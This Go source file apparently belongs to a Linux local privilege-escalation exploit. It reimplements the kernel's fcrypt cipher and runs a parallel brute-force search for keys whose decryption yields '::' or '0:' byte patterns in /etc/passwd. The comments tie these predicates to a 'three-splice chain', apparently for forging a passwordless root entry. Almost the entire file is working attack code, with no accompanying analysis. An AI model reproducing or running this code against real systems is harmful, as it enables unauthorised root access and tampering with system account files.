func fcryptInitSboxes() {
	for i := 0; i < 256; i++ {
		fcSbox0[i] = bits.ReverseBytes32(uint32(fcSbox0Raw[i]) << 3)
		fcSbox1[i] = bits.ReverseBytes32(((uint32(fcSbox1Raw[i]) & 0x1f) << 27) | (uint32(fcSbox1Raw[i]) >> 5))
		fcSbox2[i] = bits.ReverseBytes32(uint32(fcSbox2Raw[i]) << 11)
		fcSbox3[i] = bits.ReverseBytes32(uint32(fcSbox3Raw[i]) << 19)
	}
}

type fcryptCtx struct {
	sched [16]uint32
}

func fcRor56(k uint64, n uint) uint64 {
	return (k >> n) | ((k & ((1 << n) - 1)) << (56 - n))
}

func fcryptSetkey(ctx *fcryptCtx, key [8]byte) {
	var k uint64
	k = uint64(key[0] >> 1)
	k = (k << 7) | uint64(key[1]>>1)
	k = (k << 7) | uint64(key[2]>>1)
	k = (k << 7) | uint64(key[3]>>1)
	k = (k << 7) | uint64(key[4]>>1)
	k = (k << 7) | uint64(key[5]>>1)
	k = (k << 7) | uint64(key[6]>>1)
	k = (k << 7) | uint64(key[7]>>1)

	for i := 0; i < 16; i++ {
		ctx.sched[i] = bits.ReverseBytes32(uint32(k))
		k = fcRor56(k, 11)
	}
}

// fcF: apply Feistel function, returns contribution to L.
// Mirrors the C FC_F macro: u.l = sched ^ R; L ^= sbox[u.c[0..3]]
// u.l is stored in host (LE) order, so u.c[0] = LSB of u.l.
func fcF(R, sched uint32) uint32 {
	u := sched ^ R
	var b [4]byte
	binary.LittleEndian.PutUint32(b[:], u)
	return fcSbox0[b[0]] ^ fcSbox1[b[1]] ^ fcSbox2[b[2]] ^ fcSbox3[b[3]]
}

// fcryptDecrypt mirrors fcrypt_decrypt() from kernel crypto/fcrypt.c.
// The C macro FC_F(R_, L_, sched_) means: L_ ^= F(R_, sched_).
// So FC_F(L, R, sched[f]) → R ^= F(L, sched[f])   (L is input, R accumulates)
//    FC_F(R, L, sched[e]) → L ^= F(R, sched[e])   (R is input, L accumulates)
func fcryptDecrypt(ctx *fcryptCtx, in [8]byte) [8]byte {
	L := binary.LittleEndian.Uint32(in[0:4])
	R := binary.LittleEndian.Uint32(in[4:8])

	R ^= fcF(L, ctx.sched[0xf])
	L ^= fcF(R, ctx.sched[0xe])
	R ^= fcF(L, ctx.sched[0xd])
	L ^= fcF(R, ctx.sched[0xc])
	R ^= fcF(L, ctx.sched[0xb])
	L ^= fcF(R, ctx.sched[0xa])
	R ^= fcF(L, ctx.sched[0x9])
	L ^= fcF(R, ctx.sched[0x8])
	R ^= fcF(L, ctx.sched[0x7])
	L ^= fcF(R, ctx.sched[0x6])
	R ^= fcF(L, ctx.sched[0x5])
	L ^= fcF(R, ctx.sched[0x4])
	R ^= fcF(L, ctx.sched[0x3])
	L ^= fcF(R, ctx.sched[0x2])
	R ^= fcF(L, ctx.sched[0x1])
	L ^= fcF(R, ctx.sched[0x0])

	var out [8]byte
	binary.LittleEndian.PutUint32(out[0:4], L)
	binary.LittleEndian.PutUint32(out[4:8], R)
	return out
}

// fcSplitmix64: same PRNG as the C brute-force loop.
func fcSplitmix64(s *uint64) uint64 {
	*s += 0x9E3779B97F4A7C15
	z := *s
	z = (z ^ (z >> 30)) * 0xBF58476D1CE4E5B9
	z = (z ^ (z >> 27)) * 0x94D049BB133111EB
	return z ^ (z >> 31)
}

// Predicates on /etc/passwd bytes after decryption (three-splice chain).
func checkPa(P [8]byte) bool { return P[0] == ':' && P[1] == ':' }
func checkPb(P [8]byte) bool { return P[0] == '0' && P[1] == ':' }
func checkPc(P [8]byte) bool {
	if P[0] != '0' || P[1] != ':' || P[7] != ':' {
		return false
	}
	for i := 2; i < 7; i++ {
		if P[i] == ':' || P[i] == 0 || P[i] == '\n' {
			return false
		}
	}
	return true
}

type bruteResult struct {
	K [8]byte
	P [8]byte
}

// findKOffline parallelises the brute-force across all CPU cores.
// Each worker gets a different seed to cover the key space without overlap.
func findKOffline(C [8]byte, maxIters uint64, check func([8]byte) bool, seedInit uint64, label string) (K, P [8]byte, ok bool) {
	numWorkers := runtime.NumCPU()
	resultCh := make(chan bruteResult, 1)
	var found int32
	start := time.Now()

	var wg sync.WaitGroup
	perWorker := maxIters / uint64(numWorkers)

	for w := 0; w < numWorkers; w++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()
			seed := seedInit ^ uint64(workerID)*0xDEADBEEFCAFEBABE
			var ctx fcryptCtx
			var k [8]byte

			for iter := uint64(0); iter < perWorker; iter++ {
				if atomic.LoadInt32(&found) != 0 {
					return
				}
				r := fcSplitmix64(&seed)
				binary.LittleEndian.PutUint64(k[:], r)
				fcryptSetkey(&ctx, k)
				p := fcryptDecrypt(&ctx, C)
				if check(p) {
					if atomic.CompareAndSwapInt32(&found, 0, 1) {
						resultCh <- bruteResult{K: k, P: p}
					}
					return
				}
				if workerID == 0 && (iter&0x3FFFFFF) == 0 && iter > 0 {
					dt := time.Since(start).Seconds()
					fmt.Fprintf(os.Stderr, "  [%s %.1fs] iter=%d (%.2fM/s)\n",
						label, dt, iter*uint64(numWorkers), float64(iter*uint64(numWorkers))/dt/1e6)
				}
			}
		}(w)
	}

	go func() {
		wg.Wait()
		close(resultCh)
	}()

	res, ok2 := <-resultCh
	if !ok2 {
		return K, P, false
	}
	return res.K, res.P, true
}

// fcryptSelftest verifies the implementation against the kernel test vector:
//   K=0, decrypt(0E0900C73EF7ED41) = 0000000000000000
func fcryptSelftest() bool {
	fcryptInitSboxes()
	var zeroKey [8]byte
	cv := [8]byte{0x0E, 0x09, 0x00, 0xC7, 0x3E, 0xF7, 0xED, 0x41}
	var ctx fcryptCtx
	fcryptSetkey(&ctx, zeroKey)
	out := fcryptDecrypt(&ctx, cv)
	return out == [8]byte{}
}
